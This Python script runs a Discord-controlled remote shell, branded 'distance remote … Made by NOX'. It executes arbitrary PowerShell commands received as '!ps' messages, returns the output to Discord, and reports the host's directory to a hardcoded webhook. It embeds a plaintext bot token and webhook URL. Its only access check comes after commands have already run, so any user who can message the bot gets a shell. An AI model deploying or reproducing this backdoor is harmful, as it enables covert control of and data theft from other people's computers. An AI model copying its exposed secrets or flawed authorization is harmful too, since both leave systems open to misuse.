import re
import time
import requests
import pyautogui
import subprocess
import os
import asyncio
import threading
import discord


WEBHOOK = "https://discord.com/api/webhooks/1555293931430871231/138UORmIQmU_TLRIniBJ6k3r5y4aI1sM59Mc34ExacZrS79beXOkLL-UfBncmYTYWAxb"
TOKEN_DISCORD = "MTU1NTM2NjA2NTkzOTI5MjIxMA.GwJ7A5.8ej-emq-ty_tP3l5L9AZ0064n5Qm8Cx4ZV_x88"
CANAL_ID = 1555293859955609700       
MON_ID_DISCORD = 1539548235251580940

DELAI_ANTIDOUBLON = 3  # secondes
derniers = {}          # texte du chat -> heure du dernier traitement



def deja_traite(texte):
    maintenant = time.time()
    # nettoie les entrées anciennes
    for k in [k for k, t in derniers.items() if maintenant - t > DELAI_ANTIDOUBLON]:
        del derniers[k]
    if texte in derniers:
        return True
    derniers[texte] = maintenant
    return False

def envoyer_message(texte):
    pyautogui.press("t")
    time.sleep(0.2)
    pyautogui.write(texte, interval=0.03)
    pyautogui.press("enter")

dossier_courant = os.path.expanduser("~") 

def executer_powershell(cmd):
    global dossier_courant
    cmd = cmd.strip()

    # Gestion de cd : on change le dossier mémorisé par le script
    if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
        cible = cmd[2:].strip().strip('"')
        if not cible:
            return dossier_courant
        nouveau = os.path.abspath(os.path.join(dossier_courant, os.path.expanduser(cible)))
        if os.path.isdir(nouveau):
            dossier_courant = nouveau
            return nouveau
        return f"Dossier introuvable : {nouveau}"

    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command", cmd],
            capture_output=True, text=True, timeout=30,
            cwd=dossier_courant,
        )
        return (r.stdout + r.stderr).strip() or "(aucune sortie)"
    except subprocess.TimeoutExpired:
        return "Commande trop longue, annulée"
    
def lancer_powershell(cmd):
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command", cmd],
            capture_output=True, text=True, timeout=30,
        )
        print(r.stdout or r.stderr, flush=True)
    except subprocess.TimeoutExpired:
        print("Commande trop longue, annulée")

def lancer_powershell_start(cmd):
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command", cmd],
            capture_output=True, text=True, timeout=30,
        )
        print(r.stdout or r.stderr, flush=True)
        return r.stdout
    except subprocess.TimeoutExpired:
        print("Commande trop longue, annulée")
        return "e"


def envoyer_discord(texte):
    try:
        requests.post(WEBHOOK, json={"content": texte}, timeout=5)
    except requests.RequestException as e:
        print("Erreur Discord :", e)

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print("Connecté en tant que", client.user)

@client.event
async def on_message(message):
    print(message.content)
    

    if message.content.startswith("!ps "):
        sortie = await asyncio.to_thread(executer_powershell, message.content[4:])
        sortie = sortie.replace("```", "'''")[:1900]
        await message.reply(f"```\n{sortie}\n```")
    if message.author == client.user:
            return
    if message.channel.id != CANAL_ID or message.author.id != MON_ID_DISCORD:
            return

threading.Thread(target=client.run, args=(TOKEN_DISCORD,), daemon=True).start()

envoyer_discord("Welcome to distance remote\n\n Made by NOX!\n\n")
envoyer_discord(lancer_powershell_start("pwd"))
envoyer_discord("pc info: ")
#envoyer_discord(lancer_powershell_start("ipconfig.exe"))

while True: 
    x=1

        
        
